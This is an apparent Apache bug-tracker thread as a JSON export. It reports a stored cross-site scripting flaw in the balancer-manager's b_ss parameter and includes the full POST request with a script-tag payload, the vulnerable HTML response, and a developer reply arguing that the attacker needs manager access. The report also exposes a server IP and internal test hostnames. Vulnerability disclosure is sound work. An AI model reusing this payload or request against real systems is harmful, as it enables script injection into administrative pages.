[{"attachment_id": null, "tags": [], "bug_id": 59561, "is_private": false, "count": 0, "id": 191021, "time": "2016-05-17T10:50:42Z", "creator": "mamut1609@gmail.com", "creation_time": "2016-05-17T10:50:42Z", "text": "Parameter: b_ss\n\nIt is possible to include javascript to site.\n\nPOST /balancer/ HTTP/1.1\nHost: 193.25.161.222:8443\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nReferer: https://193.25.161.222:8443/balancer/?b=sgb_cluster&nonce=afb01cc6-57d6-402a-a118-ccc1ded6833e\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 112\n\nb_ss=ROUTEIDzwmgn<script>alert(1)<%2fscript>f1how&b=sgb_cluster&b_max=1&b_sforce=0&b_tmo=0&b_lbm=heartbeat&nonce=afb01cc6-57d6-402a-a118-ccc1ded6833e\n\nResponse:\n\nHTTP/1.1 200 OK\nDate: Tue, 17 May 2016 09:41:10 GMT\nServer: Apache\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\nConnection: close\nContent-Type: text/html; charset=ISO-8859-1\nContent-Length: 7648\n\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n<html><head><title>Balancer Manager</title>\n<style type='text/css'>\ntable {\n border-width: 1px;\n border-spacing: 3px;\n border-style: solid;\n border-color: gray;\n border-collapse: collapse;\n background-color: white;\n text-align: center;\n}\nth {\n border-width: 1px;\n padding: 2px;\n border-style: dotted;\n border-color: gray;\n background-color: white;\n text-align: center;\n}\ntd {\n border-width: 1px;\n padding: 2px;\n border-style: dotted;\n border-color: gray;\n background-color: white;\n text-align: center;\n}\n</style>\n</head>\n<body><h1>Load Balancer Manager for 193.25.161.222</h1>\n\n<dl><dt>Server Version: Apache/2.4.6 (Red Hat Enterprise Linux) OpenSSL/1.0.1e-fips mod_jk/1.2.40</dt>\n<dt>Server Built: Dec  2 2014 08:09:42\n</dt></dl>\n<hr />\n<h3>LoadBalancer Status for <a href=\"/balancer/?b=sgb_cluster&nonce=afb01cc6-57d6-402a-a118-ccc1ded6833e\">balancer://sgb_cluster</a> [p17f73b00_sgb_cluster]</h3>\n\n\n<table><tr><th>MaxMembers</th><th>StickySession</th><th>DisableFailover</th><th>Timeout</th><th>FailoverAttempts</th><th>Method</th><th>Path</th><th>Active</th></tr>\n<tr><td>2 [2 Used]</td>\n<td>ROUTEIDzwmgn<script>alert(1)</script>f1how<td>Off</td>\n</td><td>0</td><td>1</td>\n<td>heartbeat</td>\n<td>/sgb/mobile-seitc/servlets</td>\n<td>Yes</td>\n</table>\n<br />\n\n<table><tr><th>Worker URL</th><th>Route</th><th>RouteRedir</th><th>Factor</th><th>Set</th><th>Status</th><th>Elected</th><th>Busy</th><th>Load</th><th>To</th><th>From</th></tr>\n<tr>\n<td><a href=\"/balancer/?b=sgb_cluster&w=https://polhceseitc01-test.polcard.com.pl:8443/mobile-seitc/servlets&nonce=afb01cc6-57d6-402a-a118-ccc1ded6833e\">https://polhceseitc01-test.polcard.com.pl:8443/mobile-seitc/servlets</a></td><td>sgb1</td><td></td><td>1</td><td>0</td><td>Init Ok </td><td>0</td><td>0</td><td>1</td><td>  0 </td><td>  0 </td></tr>\n<tr>\n<td><a href=\"/balancer/?b=sgb_cluster&w=https://polhceseitc02-test.polcard.com.pl:8443/mobile-seitc/servlets&nonce=afb01cc6-57d6-402a-a118-ccc1ded6833e\">https://polhceseitc02-test.polcard.com.pl:8443/mobile-seitc/servlets</a></td><td>sgb2</td><td>555-555-0199@example.com</td><td>1</td><td>0</td><td>Init Ok </td><td>0</td><td>0</td><td>1</td><td>  0 </td><td>  0 </td></tr>\n</table>\n<hr />\n<h3>LoadBalancer Status for <a href=\"/balancer/?b=rbp_cluster&nonce=cd3d7a62-1c66-45a7-bd12-a8eefdda4fa0\">balancer://rbp_cluster</a> [p17f73b00_rbp_cluster]</h3>\n\n\n<table><tr><th>MaxMembers</th><th>StickySession</th><th>DisableFailover</th><th>Timeout</th><th>FailoverAttempts</th><th>Method</th><th>Path</th><th>Active</th></tr>\n<tr><td>2 [2 Used]</td>\n<td>ROUTEID<td>Off</td>\n</td><td>0</td><td>1</td>\n<td>byrequests</td>\n<td>/rbp/mobile-seitc/servlets</td>\n<td>Yes</td>\n</table>\n<br />\n\n<table><tr><th>Worker URL</th><th>Route</th><th>RouteRedir</th><th>Factor</th><th>Set</th><th>Status</th><th>Elected</th><th>Busy</th><th>Load</th><th>To</th><th>From</th></tr>\n<tr>\n<td><a href=\"/balancer/?b=rbp_cluster&w=https://polhceseitc01-test.polcard.com.pl:8443/mobile-seitc/servlets&nonce=cd3d7a62-1c66-45a7-bd12-a8eefdda4fa0\">https://polhceseitc01-test.polcard.com.pl:8443/mobile-seitc/servlets</a></td><td>rbp1</td><td></td><td>1</td><td>0</td><td>Init Ok </td><td>0</td><td>0</td><td>0</td><td>  0 </td><td>  0 </td></tr>\n<tr>\n<td><a href=\"/balancer/?b=rbp_cluster&w=https://polhceseitc02-test.polcard.com.pl:8443/mobile-seitc/servlets&nonce=cd3d7a62-1c66-45a7-bd12-a8eefdda4fa0\">https://polhceseitc02-test.polcard.com.pl:8443/mobile-seitc/servlets</a></td><td>rbp2</td><td></td><td>1</td><td>0</td><td>Init Ok </td><td>0</td><td>0</td><td>0</td><td>  0 </td><td>  0 </td></tr>\n</table>\n<hr />\n<h3>LoadBalancer Status for <a href=\"/balancer/?b=erb_cluster&nonce=595d4440-c227-41b5-8e0b-7376b32fba01\">balancer://erb_cluster</a> [p17f73b00_erb_cluster]</h3>\n\n\n<table><tr><th>MaxMembers</th><th>StickySession</th><th>DisableFailover</th><th>Timeout</th><th>FailoverAttempts</th><th>Method</th><th>Path</th><th>Active</th></tr>\n<tr><td>2 [2 Used]</td>\n<td>ROUTEID<td>Off</td>\n</td><td>0</td><td>1</td>\n<td>byrequests</td>\n<td>/erb/mobile-seitc/servlets</td>\n<td>Yes</td>\n</table>\n<br />\n\n<table><tr><th>Worker URL</th><th>Route</th><th>RouteRedir</th><th>Factor</th><th>Set</th><th>Status</th><th>Elected</th><th>Busy</th><th>Load</th><th>To</th><th>From</th></tr>\n<tr>\n<td><a href=\"/balancer/?b=erb_cluster&w=https://polhceseitc01-test.polcard.com.pl:8443/mobile-seitc/servlets&nonce=595d4440-c227-41b5-8e0b-7376b32fba01\">https://polhceseitc01-test.polcard.com.pl:8443/mobile-seitc/servlets</a></td><td>erb1</td><td></td><td>1</td><td>0</td><td>Init Ok </td><td>1</td><td>0</td><td>0</td><td>1.5K</td><td> 20 </td></tr>\n<tr>\n<td><a href=\"/balancer/?b=erb_cluster&w=https://polhceseitc02-test.polcard.com.pl:8443/mobile-seitc/servlets&nonce=595d4440-c227-41b5-8e0b-7376b32fba01\">https://polhceseitc02-test.polcard.com.pl:8443/mobile-seitc/servlets</a></td><td>erb2</td><td></td><td>1</td><td>0</td><td>Init Ok </td><td>1</td><td>0</td><td>0</td><td>1.5K</td><td> 20 </td></tr>\n</table>\n<hr />\n<h3>LoadBalancer Status for <a href=\"/balancer/?b=get_cluster&nonce=fd098a63-6823-4136-92ea-a107dd82293a\">balancer://get_cluster</a> [p17f73b00_get_cluster]</h3>\n\n\n<table><tr><th>MaxMembers</th><th>StickySession</th><th>DisableFailover</th><th>Timeout</th><th>FailoverAttempts</th><th>Method</th><th>Path</th><th>Active</th></tr>\n<tr><td>2 [2 Used]</td>\n<td>ROUTEID<td>Off</td>\n</td><td>0</td><td>1</td>\n<td>byrequests</td>\n<td>/get/mobile-seitc/servlets</td>\n<td>Yes</td>\n</table>\n<br />\n\n<table><tr><th>Worker URL</th><th>Route</th><th>RouteRedir</th><th>Factor</th><th>Set</th><th>Status</th><th>Elected</th><th>Busy</th><th>Load</th><th>To</th><th>From</th></tr>\n<tr>\n<td><a href=\"/balancer/?b=get_cluster&w=https://polhceseitc01-test.polcard.com.pl:8443/mobile-seitc/servlets&nonce=fd098a63-6823-4136-92ea-a107dd82293a\">https://polhceseitc01-test.polcard.com.pl:8443/mobile-seitc/servlets</a></td><td>get1</td><td></td><td>1</td><td>0</td><td>Init Ok </td><td>0</td><td>0</td><td>0</td><td>  0 </td><td>  0 </td></tr>\n<tr>\n<td><a href=\"/balancer/?b=get_cluster&w=https://polhceseitc02-test.polcard.com.pl:8443/mobile-seitc/servlets&nonce=fd098a63-6823-4136-92ea-a107dd82293a\">https://polhceseitc02-test.polcard.com.pl:8443/mobile-seitc/servlets</a></td><td>get2</td><td></td><td>1</td><td>0</td><td>Init Ok </td><td>0</td><td>0</td><td>0</td><td>  0 </td><td>  0 </td></tr>\n</table>\n<hr />\n<h3>Edit balancer settings for balancer://sgb_cluster</h3>\n<form method='POST' enctype='application/x-www-form-urlencoded' action='https://193.25.161.222:8443/balancer/'>\n<dl>\n<table>\n<tr><td>LBmethod:</td><td>\n<select name='b_lbm' id='b_lbm'><option value='bytraffic'>bytraffic\n<option value='heartbeat' selected >heartbeat\n<option value='bybusyness'>bybusyness\n<option value='byrequests'>byrequests\n</select>\n</td></tr>\n<tr><td>Timeout:</td><td><input name='b_tmo' id='b_tmo' type=text value='0'></td></tr>\n<tr><td>Failover Attempts:</td><td><input name='b_max' id='b_max' type=text value='1'></td></tr>\n<tr><td>Disable Failover:</td><td>On <input name='b_sforce' id='b_sforce' value='1' type=radio> <br/> Off <input name='b_sforce' id='b_sforce' value='0' type=radio checked></td>\n<tr><td>Sticky Session:</td><td><input name='b_ss' id='b_ss' size=64 type=text value ='ROUTEIDzwmgn<script>alert(1)</script>f1how'>&nbsp;&nbsp;&nbsp;&nbsp;(Use '-' to delete)</td></tr>\n<tr><td colspan=2><input type=submit value='Submit'></td></tr>\n</table>\n<input type=hidden name='b' id='b' value='sgb_cluster'>\n<input type=hidden name='nonce' id='nonce' value='afb01cc6-57d6-402a-a118-ccc1ded6833e'>\n</form>\n<hr />\n</body></html>"}, {"count": 1, "tags": [], "bug_id": 59561, "text": "This should only be possible if the attacker has access to the balancer-manager application itself. If so, there is a lot more the attacker can do.", "id": 192221, "time": "2016-07-07T17:53:49Z", "creator": "jim@apache.org", "creation_time": "2016-07-07T17:53:49Z", "is_private": false, "attachment_id": null}]